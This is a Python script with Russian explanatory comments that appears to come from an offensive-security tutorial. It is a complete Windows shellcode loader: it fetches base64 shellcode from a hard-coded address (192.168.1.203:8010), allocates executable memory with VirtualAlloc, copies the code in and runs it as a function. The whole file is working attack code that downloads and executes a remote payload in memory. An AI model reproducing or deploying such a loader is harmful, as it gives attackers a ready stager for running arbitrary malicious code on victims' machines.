from urllib import request
import base64
import ctypes

kernel32 = ctypes.windll.kernel32


def get_code(url):
    """ скачивает с веб-сервера шелл-код в формате base64"""
    with request.urlopen(url) as response:
        shellcode = base64.decodebytes(response.read())
    return shellcode


def write_memory(buf):
    """Для записи в память нужно сначала выделить необходимое адресное пространство (VirtualAlloc) и затем перенести в
     него буфер с шелл-кодом (RtlMoveMemory). Чтобы шелл-код смог выполниться независимо от того, является наш
     интерпретатор Python 32- или 64-битным, мы должны сделать так, чтобы вызов VirtualAlloc вернул указатель и чтобы
     вызову RtlMoveMemory в качестве аргументов передавались два указателя и объект размера. Для этого устанавливаем
     VirtualAlloc.restype и RtlMoveMemory.argtypes . Если пропустить этот этап, ширина адресного пространства,
     возвращаемого вызовом VirtualAlloc, не будет соответствовать той ширине, которую ожидает получить RtlMoveMemory."""
    length = len(buf)

    kernel32.VirtualAlloc.restype = ctypes.c_void_p
    kernel32.RtlMoveMemory.argtypes = (
        ctypes.c_void_p,
        ctypes.c_void_p,
        ctypes.c_size_t
    )

    ptr = kernel32.VirtualAlloc(None, length, 0x3000, 0x40) # параметр 0x40 говорит о том, что участок памяти будет
                                                            # доступен для чтения, записи и выполнения, но если его не
                                                            # указать, мы не сможем записывать и выполнять шелл-код.
    kernel32.RtlMoveMemory(ptr, buf, length)
    return ptr


def run(shellcode):
    """В функции run мы выделяем буфер  для хранения шелл-кода после его декодирования."""
    buffer = ctypes.create_string_buffer(shellcode)
    ptr = write_memory(buffer)
    shell_func = ctypes.cast(ptr, ctypes.CFUNCTYPE(None)) # Вызов ctypes.cast позволяет привести тип буфера, так чтобы он
                                                          # мог использоваться как указатель на функцию. Это позволит нам вызвать
                                                            # шелл-код, словно это обычная функция на языке Python
    shell_func()


if __name__ == '__main__':
    url = 'http://192.168.1.203:8010/shellcode.bin'
    shellcode = get_code(url)
    run(shellcode)